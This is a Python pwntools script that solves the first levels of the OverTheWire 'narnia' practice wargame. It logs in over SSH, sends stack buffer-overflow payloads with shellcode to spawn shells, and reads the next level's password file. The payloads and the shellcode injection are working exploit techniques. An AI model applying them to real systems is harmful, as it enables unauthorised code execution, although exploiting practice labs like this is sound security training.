#!env python3
# encoding: utf-8
from pwn import *
from pygments import highlight
from pygments.lexers import CLexer
from pygments.formatters import TerminalFormatter
import codecs
class Solver(object):

    """Docstring for Solver. """

    def __init__(self, game, log=False):
        self.game = game
        self.level = 0
        self.log = log
        self.host = "%s.labs.overthewire.org" % self.game
        self.user = "%s%d" % (self.game, self.level)
        self.password = "%s%d" % (self.game, self.level)

    def __getConnection(self):
        user = '%s%d' % (self.game, self.level)
        return ssh(user=self.user, host=self.host, password=self.password, port=2226)

    def __viewCode(self):
        code = self.conn.download_data('/narnia/' + self.user + '.c')
        log.info('Showing code...')
        print(highlight(code, CLexer(), TerminalFormatter(bg='dark')))


    def getFlag(self, shell):
        shell.sendline('cat /etc/%s_pass/%s%d' % (self.game, self.game, self.level+1))
        flag = shell.recvline().split()
        log.info('Flag: {0}'.format(flag))
        shell.close()
        return flag

    def prepare(self):
        log.info('Solving level: %d' % self.level)
        log.info('Logging in with User: %s, Password: %s' % (self.user, self.password))
        self.conn = self.__getConnection()
        self.__viewCode()

    def getBin(self):
        return "/%s/%s" % (s.game, s.user)

    def setPassword(self, password):
        self.password = password[0].decode("utf-8")

    def cleanup(self):
        self.conn.close()
        self.level += 1
        self.user = "%s%d" % (self.game, self.level)
        print

context(arch='i386', os='linux')
s = Solver("narnia")

s.prepare()
payload = ('a'*20).encode("utf-8") + p32(0xdeadbeef)
sh = s.conn.run(s.getBin())
log.info("Payload: {0}".format(payload))
sh.sendline(payload)
sh.clean()
s.setPassword(s.getFlag(sh))
s.cleanup()


s.prepare()
sh = s.conn.process(s.getBin(), env={'EGG' : asm(shellcraft.i386.linux.sh())})
sh.clean()
s.setPassword(s.getFlag(sh))
s.cleanup()

s.prepare()
payload = ('a'*87).encode("utf-8")
payload += asm(shellcraft.i386.linux.sh())
payload += p32(0xffffd610)
log.info("Payload: {0}".format(payload))
sh = s.conn.process([s.getBin(), payload])
gdb.attach(sh, '''
    break main
    r
    x/10xw $esp
    ''')
sh.interactive()
#  s.setPassword(s.getFlag(sh))
s.cleanup()


